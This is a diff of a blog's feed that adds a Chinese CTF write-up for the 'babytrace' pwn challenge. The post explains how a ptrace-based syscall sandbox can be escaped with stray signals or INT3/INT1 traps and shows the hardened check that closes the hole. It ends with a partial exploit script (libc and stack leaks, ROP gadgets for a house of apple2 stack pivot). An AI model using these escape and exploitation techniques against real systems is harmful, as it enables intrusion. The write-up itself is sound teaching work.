@@ -1,4 +1,506 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-01-13T17:54:20+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>amor fati.</subtitle><entry><title type="html">GhostWrite #2: 漏洞利用代码分析</title><link href="https://www.cameudis.com/2025/01/06/GhostWrite-2.html" rel="alternate" type="text/html" title="GhostWrite #2: 漏洞利用代码分析" /><published>2025-01-06T00:00:00+08:00</published><updated>2025-01-06T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/01/06/GhostWrite-2</id><content type="html" xml:base="https://www.cameudis.com/2025/01/06/GhostWrite-2.html"><![CDATA[<h2 id="qemu-patch">QEMU Patch</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-01-20T16:57:35+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>amor fati.</subtitle><entry><title type="html">西湖论剑 2025 PWN Writeup</title><link href="https://www.cameudis.com/2025/01/20/XHLJ-2025.html" rel="alternate" type="text/html" title="西湖论剑 2025 PWN Writeup" /><published>2025-01-20T00:00:00+08:00</published><updated>2025-01-20T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/01/20/XHLJ-2025</id><content type="html" xml:base="https://www.cameudis.com/2025/01/20/XHLJ-2025.html"><![CDATA[<h2 id="babytrace">babytrace</h2>
+
+<p>本题基于 <code class="language-plaintext highlighter-rouge">ptrace</code> 实现了一个简易的 syscall 沙盒，由父进程检测子进程，子进程与用户交互。每次子进程进入 syscall 时，父进程会检测保存在 <code class="language-plaintext highlighter-rouge">orig_rax</code> 中的 syscall number，如果不在白名单内就将 <code class="language-plaintext highlighter-rouge">rax</code> 强制改为 <code class="language-plaintext highlighter-rouge">-1</code>。</p>
+
+<p>在互联网上搜索关键词 <code class="language-plaintext highlighter-rouge">pwn ptrace sandbox</code> 即可搜到这一篇 writeup：<a href="https://ctftime.org/writeup/20115">CTFtime.org / PlaidCTF 2020 / sandybox / Writeup</a>，教你如何使用 <code class="language-plaintext highlighter-rouge">INT3</code> 来绕过这种 sandbox 设计，但作者并没有仔细分析为什么 <code class="language-plaintext highlighter-rouge">INT3</code> 有这种神奇的效果。Let’s dive in…</p>
+
+<h3 id="ptrace-原理">ptrace 原理</h3>
+
+<p>ptrace 是一套 Linux 提供的调试机制，允许一个进程 attach 到另一个进程，设置各点断点，并操控其寄存器、内存等状态。</p>
+
+<p>在 ptrace 的 man 手册中，我们可以看到其实现方法。</p>
+
+<blockquote>
+  <p>While being traced, the tracee will stop each time a signal is delivered, even if the signal is being ignored.  (An exception is SIGKILL, which has its usual effect.)  The tracer will be notified at its next call to waitpid(2) (or one of the  related “wait” system calls); that call will return a status value containing information that indicates the cause of the stop in the tracee.  While the tracee is stopped, the tracer can use various ptrace operations  to  inspect  and modify  the  tracee.   The tracer then causes the tracee to continue, optionally ignoring the delivered signal (or even delivering a different signal instead).</p>
+</blockquote>
+
+<p>被调试进程（tracee）每次收到一个信号，都会暂停下来，等待调试进程（tracer）调用 <code class="language-plaintext highlighter-rouge">waitpid</code>。在 tracer 从 <code class="language-plaintext highlighter-rouge">waitpid</code> 中返回，执行了一些调试相关操作后，它会通知内核继续执行 tracee 程序。tracer 可以通过 ` waitpid ` 设置的 ` status ` 来获取 tracee 停下的原因，即 tracee 是因为哪一个信号而停下来的， 比如是 ` SIGKILL ` 还是 ` SIGTRAP `？</p>
+
+<p>如果我们要监视某个进程的 syscall，我们可以使用 <code class="language-plaintext highlighter-rouge">ptrace(PTRACE_SYSCALL, pid, 0, 0)</code> ，让内核在下次 tracee <strong>执行或退出</strong> syscall 的时候给其发送一个 <code class="language-plaintext highlighter-rouge">SIGTRAP</code> 信号，将其停下来。详细的说明可以在 man 中找到：</p>
+
+<blockquote>
+  <p>PTRACE_SYSCALL, PTRACE_SINGLESTEP
+Restart the stopped tracee as for PTRACE_CONT, but arrange for the tracee to be stopped at the next entry to or exit from a system call, or after execution of a single instruction, respectively. (The tracee will also, as usual, be stopped upon receipt of a signal.) From the tracer’s perspective, the tracee will appear to have been stopped by receipt of a SIGTRAP.
+So, for PTRACE_SYSCALL, for example, the idea is to inspect the arguments to the system call at the first stop, then do another PTRACE_SYSCALL and inspect the return value of the system call at the second stop. The data argument is treated as for PTRACE_CONT. (addr is ignored.)</p>
+</blockquote>
+
+<p>这段文字中，官方给出的使用例是这样的：</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">ptrace(PTRACE_SYSCALL); wait();</code></li>
+  <li>检查 syscall 参数</li>
+  <li><code class="language-plaintext highlighter-rouge">ptrace(PTRACE_SYSCALL); wait();</code></li>
+  <li>检查 syscall 返回值</li>
+</ol>
+
+<p>知道这些以后，我们就可以实现一个简单的 ptrace sandbox 了。</p>
+
+<h3 id="ptrace-sandbox">ptrace sandbox</h3>
+
+<p>题目的 sandbox 实现类似这样（可以拿去编译改改玩玩）：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+  <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">stat_loc</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// child</span>
+
+    <span class="c1">// waiting for parent to attach...</span>
+    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">mypid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+    <span class="n">kill</span><span class="p">(</span><span class="n">mypid</span><span class="p">,</span> <span class="n">SIGSTOP</span><span class="p">);</span>
+
+    <span class="c1">// do something...</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"echo hello"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// parent</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error1"</span><span class="p">);</span>
+
+    <span class="c1">// monitor syscall</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="c1">// wait child to stop at syscall</span>
+      <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error2"</span><span class="p">);</span>
+
+      <span class="c1">// exit if child die</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">||</span> <span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGSEGV</span><span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+
+      <span class="c1">// perform check</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"GETREGS error"</span><span class="p">);</span>
+      <span class="kt">size_t</span> <span class="n">syscall_num</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Syscall number: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">syscall_num</span><span class="p">);</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_read</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_write</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_fstat</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_exit</span> <span class="o">||</span>
+            <span class="n">syscall_num</span> <span class="o">==</span> <span class="n">SYS_exit_group</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Bad Syscall"</span><span class="p">);</span>
+        <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">regs</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"SETREGS error"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+      <span class="c1">// wait for syscall ret</span>
+      <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error3"</span><span class="p">);</span>
+
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">||</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">!=</span> <span class="n">SIGSEGV</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>在父进程的 do-while 循环中，有两次 <code class="language-plaintext highlighter-rouge">ptrace(PTRACE_SYSCALL, pid, 0, 0)</code>，这分别对应进入和退出 syscall。我们只需要检查进入 syscall 时的参数，所以第二次 <code class="language-plaintext highlighter-rouge">ptrace</code> 停下后我们只是什么都不干，继续下一次循环。</p>
+
+<p>直接编译运行程序，我们应该可以看到子进程并没有成功运行 <code class="language-plaintext highlighter-rouge">system("echo 'Hello, world!'");</code>，这表明我们的功能似乎正常执行了。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./a.out
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 13
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 13
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 14
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 9
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 13
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 13
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 14
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 231
+</code></pre></div></div>
+
+<h3 id="ptrace-bad-use">ptrace bad use</h3>
+
+<p>然而，这段代码中还缺少了一个非常重要的部分——检查 tracee 是因为什么原因而停下来的。在上一节中我们提到，<code class="language-plaintext highlighter-rouge"> ptrace(PTRACE_SYSCALL, pid, 0, 0) </code> 的功能是让内核在下次进入或退出 syscall 的时候，给 tracee 发送一个 SIGTRAP 信号。tracer 不能确保 waitpid 返回是因为子进程进入了 syscall 还是什么其他的原因。</p>
+
+<p>让我们对子进程做出一些修改（同时，在父进程里允许 clock_nanosleep 系统调用）：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// waiting for parent to attach...</span>
+<span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+<span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="kt">int</span> <span class="n">mypid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+<span class="n">kill</span><span class="p">(</span><span class="n">mypid</span><span class="p">,</span> <span class="n">SIGSTOP</span><span class="p">);</span>
+
+<span class="c1">// do something...</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Child PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mypid</span><span class="p">);</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+
+<span class="n">system</span><span class="p">(</span><span class="s">"echo 'Hello, World!'"</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>现在，子进程会在调用 system 函数前进入一段 10s 的睡眠时间。让我们趁着这个机会，给子进程发个随便什么信号试试：</p>
+
+<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202501201356700.png" alt="image.png" /></p>
+
+<p>BOOM！子进程逃出了沙盒，成功执行了 <code class="language-plaintext highlighter-rouge">system("echo 'Hello, World!'")</code>。这是因为，我们发送给子进程的 <code class="language-plaintext highlighter-rouge">SIGSTOP</code> 信号被捕捉，父进程以为此时子进程进入了 syscall entry。因此，后续子进程真正进入 syscall entry 时，父进程会将其当成 syscall exit，不进行检查。</p>
+
+<p>我们这里是借助了一个第三方进程进行攻击，有没有办法让子进程给自身发送一个信号呢？我们通常发送信号使用的 kill 同时也是一个系统调用，会被沙盒限制，遗憾离场了。</p>
+
+<p>在 amd64 架构的 Linux 中，有一些 <code class="language-plaintext highlighter-rouge">int</code> 指令被赋予了特殊的作用。如果你熟悉 GDB 的断点原理的话，就会知道 <code class="language-plaintext highlighter-rouge">INT3</code> 指令的神奇功效，这条指令专门用来产生一个 <code class="language-plaintext highlighter-rouge">SIGTRAP</code>。GDB 同样基于 ptrace 进行调试，当你执行 <code class="language-plaintext highlighter-rouge">b *0x415411</code> 时，GDB 会在保存 <code class="language-plaintext highlighter-rouge">0x415411</code> 处的一个字节后将其覆盖为 <code class="language-plaintext highlighter-rouge">INT3</code> 指令。在执行了这条 <code class="language-plaintext highlighter-rouge">INT3</code> 之后，被调试的进程收到一个 <code class="language-plaintext highlighter-rouge">SIGTRAP</code>，控制就回到了 GDB 的手中。</p>
+
+<p>我们可以让子进程在进行 <code class="language-plaintext highlighter-rouge">system()</code> 前先执行一次 ` INT3 ` 指令，同样可以逃出 sandbox。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// do something...</span>
+<span class="n">asm</span><span class="p">(</span><span class="s">"int3"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"echo 'Hello, World!'"</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc pt.c <span class="o">&amp;&amp;</span> ./a.out
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: <span class="nt">-1</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Syscall number: 14
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bad Syscall
+Hello, World!
+...
+</code></pre></div></div>
+
+<p>第一行 <code class="language-plaintext highlighter-rouge">[*] Syscall number: -1</code> ，就是那条 <code class="language-plaintext highlighter-rouge">INT3</code> 指令产生的 <code class="language-plaintext highlighter-rouge">SIGTRAP</code> 被父进程捕获时产生的输出。</p>
+
+<p>除了 <code class="language-plaintext highlighter-rouge">INT3</code> 以外，<code class="language-plaintext highlighter-rouge">INT1</code> 也有类似的功能，也是本文在攻击时使用的方法（GLIBC 中居然神奇地存在 <code class="language-plaintext highlighter-rouge">INT1; ret;</code> gadget）。详情参考 <a href="https://github.com/Mic92/x86_64-linux-cheatsheats/blob/master/pages/INT1">x86_64-linux-cheatsheats/pages/INT1 at master · Mic92/x86_64-linux-cheatsheats · GitHub</a>。</p>
+
+<h3 id="ptrace-good-use">ptrace good use</h3>
+
+<p>实际上，ptrace 机制已经给程序提供了区分同一个信号（如 <code class="language-plaintext highlighter-rouge">SIGTRAP</code>）的不同来源（syscall 还是 int3）的方法。在 <code class="language-plaintext highlighter-rouge">PTRACE_SETOPTIONS</code> 的各个 flag 说明中，有一个 flag 名为 <code class="language-plaintext highlighter-rouge">PTRACE_O_TRACESYSGOOD</code>。其说明如下：</p>
+
+<blockquote>
+  <p>PTRACE_O_TRACESYSGOOD (since Linux 2.4.6)
+	When delivering system call traps, set bit 7 in the signal number  (i.e.,  deliver  SIGTRAP|0x80).   This makes it easy for the tracer to distinguish normal traps from those caused by a system call.</p>
+</blockquote>
+
+<p>也就是说，只要 tracer 在初始化时执行：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETOPTIONS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PTRACE_O_TRACESYSGOOD</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>他就可以这样来检测当前是否为 syscall 进入/退出导致的 SIGTRAP：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error2"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGTRAP</span><span class="o">|</span><span class="mh">0x80</span><span class="p">)</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Bingo! Syscall handled."</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>我们可以包装一个用来捕获 syscall 进入/退出的函数，只有在子进程已死或进入退出 syscall 时，这个函数才会返回：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">break_syscall</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">pid</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="o">*</span><span class="n">regs</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">stat_loc</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"waitpid error"</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">SIGTRAP</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGSEGV</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">goto</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nl">ret:</span>
+  <span class="k">return</span> <span class="n">stat_loc</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>进行完备的检查后，子进程的 <code class="language-plaintext highlighter-rouge">asm("INT3")</code> 也无法逃出沙盒。加强后的 ptrace 沙盒放在文末以供参考。</p>
+
+<h3 id="利用">利用</h3>
+
+<p>题目本身提供了两次相对于栈的任意地址读（8 字节），一次相对于栈的任意地址写（8 字节），此外还有一个位于栈上大小 0x200 的 buffer 可以写入一些数据。</p>
+
+<p>由于任意写只有 8 字节，所以本题不能像栈溢出一样把 <code class="language-plaintext highlighter-rouge">saved rbp</code> 和返回地址都覆盖以后通过 <code class="language-plaintext highlighter-rouge">leave; ret;</code> 栈迁移打 ROP。可恶的出题人必须要让我们绕一个弯子。</p>
+
+<p>本文采用比较常规的做法，在泄露 libc 基地址以及栈上 buffer 的位置后，借助 house of apple2 来打 stack pivot。</p>
+
+<p>在 2.35 以前的 GLIBC 版本中，有一段被称为 magic gadget 的代码可以方便地结合 FILEIO 利用完成栈迁移：</p>
+
+<pre><code class="language-asm">; svcudp_reply+26
+mov rbp, qword ptr [rdi + 0x48];
+mov rax, qword ptr [rbp + 0x18]; 
+lea r13, [rbp + 0x10]; 
+mov dword ptr [rbp + 0x10], 0; 
+mov rdi, r13; 
+call qword ptr [rax + 0x28];
+</code></pre>
+
+<p>很可惜这段代码在题目使用的 2.35 版本中消失了，但还是有一个技巧可以完成栈迁移。在包括 <code class="language-plaintext highlighter-rouge">puts</code> 在内的一些 FILEIO 类函数中有一个加速—— <code class="language-plaintext highlighter-rouge">rbp</code> 寄存器会始终指向当前正在处理的 FILE 结构体。（类似于 gs 寄存器始终指向 TLS 结构体）</p>
+
+<p>我们可以在 FILE 结构体的开头布置一条简单的 ROP 链。在 house of apple2 劫持控制流执行 <code class="language-plaintext highlighter-rouge">leave; ret;</code> 之后，<code class="language-plaintext highlighter-rouge">rsp</code> 就会指向 FILE 结构体 +8 的位置，开始执行我们布置的 ROP 链。</p>
+
+<p>exp 脚本如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    
+    <span class="c1"># 0x00000000000c6d6e : int1 ; ret
+</span>    <span class="c1"># 0x000000000002a3e5 : pop rdi ; ret
+</span>    <span class="c1"># 0x000000000002a2e0 : pop rbp ; ret
+</span>    <span class="c1"># 0x000000000004da83 : leave ; ret
+</span>
+    <span class="n">int1</span> <span class="o">=</span> <span class="mh">0xc6d6e</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x2a3e5</span>
+    <span class="n">pop_rbp</span> <span class="o">=</span> <span class="mh">0x2a2e0</span>
+    <span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4da83</span>
+
+	<span class="c1"># leak libc
+</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">bias_base</span><span class="o">+</span><span class="mi">37</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' = '</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+	<span class="c1"># leak stack
+</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-4'</span><span class="p">)</span>
+    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' = '</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>
